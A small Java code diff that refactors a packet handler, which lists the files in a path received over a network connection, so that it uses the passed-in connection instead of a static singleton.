@@ -10,7 +10,7 @@ public class Packet15ListFiles extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Connection con) throws Exception {
-		String current = Connection.instance.readLine();
+		String current = con.readLine();
 
 		File[] files;
 
@@ -20,7 +20,7 @@ public class Packet15ListFiles extends AbstractIncomingPacket {
 			files = new File(current).listFiles();
 		}
 
-		Connection.instance.addToSendQueue(new Packet22ListFiles(files));
+		con.addToSendQueue(new Packet22ListFiles(files));
 	}
 
 }
